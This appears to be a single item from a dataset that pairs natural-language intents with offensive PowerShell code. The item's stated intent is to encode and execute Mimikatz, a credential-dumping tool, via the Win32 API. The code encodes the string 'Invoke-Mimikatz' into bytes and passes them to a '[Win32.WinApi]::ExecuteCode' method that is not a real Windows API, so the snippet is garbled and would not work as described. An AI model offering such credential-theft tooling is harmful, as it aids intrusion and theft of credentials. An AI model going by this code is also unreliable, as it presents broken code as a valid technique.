# Natural language intent:
# Encode and execute Mimikatz code using Win32 API.

$code = 'Invoke-Mimikatz'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $handle = [Win32.WinApi]::ExecuteCode($bytes)
